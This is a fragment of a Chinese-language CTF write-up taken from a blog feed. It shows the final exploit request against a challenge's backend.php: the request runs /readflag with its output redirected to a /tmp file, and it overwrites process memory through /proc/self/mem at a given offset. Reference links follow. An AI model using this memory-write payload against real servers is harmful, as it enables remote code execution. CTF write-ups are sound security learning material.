-<pre><code>backend.php?readfile=/readflag&gt;/tmp/i_o_u_hlq&amp;writefile=/proc/self/mem&amp;buffer=%90%65%f8%f5%ff%7f&amp;offset=15333784</code></pre></li>
-<li><p>直接读取<code>/tmp/i_o_u_hlq</code>就可以直接<code>getflag</code></p>
-</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG2879.png" alt="WechatIMG2879"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
-<li><p>Nu1L 西湖论剑wp</p>
-</li>
-<li><p><a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">https://blog.spoock.com/2019/10/08/proc/</a></p>
-</li>
-<li><p><a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a></p>
-</li>
-</ul>
 ]]></content>
       <categories>
         <category>CTF比赛</category>
